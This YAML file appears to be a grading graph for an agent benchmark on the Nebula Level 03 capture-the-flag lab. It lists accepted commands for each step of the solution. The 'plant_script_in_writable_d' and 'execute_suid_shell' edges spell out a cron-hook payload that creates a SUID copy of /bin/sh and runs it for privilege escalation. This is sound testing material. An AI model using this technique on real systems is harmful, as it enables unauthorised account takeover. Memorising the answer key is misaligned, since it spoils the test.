version: '0.5'
graph:
  type: reference
challenge:
  id: nebula_level03
  name: Nebula Level 03
  description: Abuse the writable.d cron mechanism to compile a SUID shell as flag03 and execute getflag.
attacker_context:
  user: level03
  access:
    method: ssh
    credentials:
      username: level03
      password: level03
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node3
irrelevant_commands:
- man
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- ls
- cd
- cat
- file
- strings
- ltrace
- strace
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Writable cron hook identified
- id: node1
  type: state
  label: Cron payload planted
- id: node2
  type: state
  label: SUID shell created
- id: node3
  type: state
  label: Execution as flag03 obtained
edges:
- id: edge0
  from: start
  to: node0
  action: inspect_flag03_home_for_cron_mechanism
  accepted_commands:
  - ls -al /home/flag03
  - ls -al /home/flag03/writable.d
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: plant_script_in_writable_d
  accepted_commands:
  - 'printf "#!/bin/sh

    cp /bin/sh /tmp/flag03sh

    chmod u+s /tmp/flag03sh

    " > /home/flag03/writable.d/payload && chmod +x /home/flag03/writable.d/payload'
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge2
  from: node1
  to: node2
  action: wait_for_cron_and_verify_suid_shell
  accepted_commands:
  - ls -l /tmp/flag03sh
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge3
  from: node2
  to: node3
  action: execute_suid_shell_and_run_getflag
  accepted_commands:
  - /tmp/flag03sh -p -c /bin/getflag
  - /tmp/flag03sh -p
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
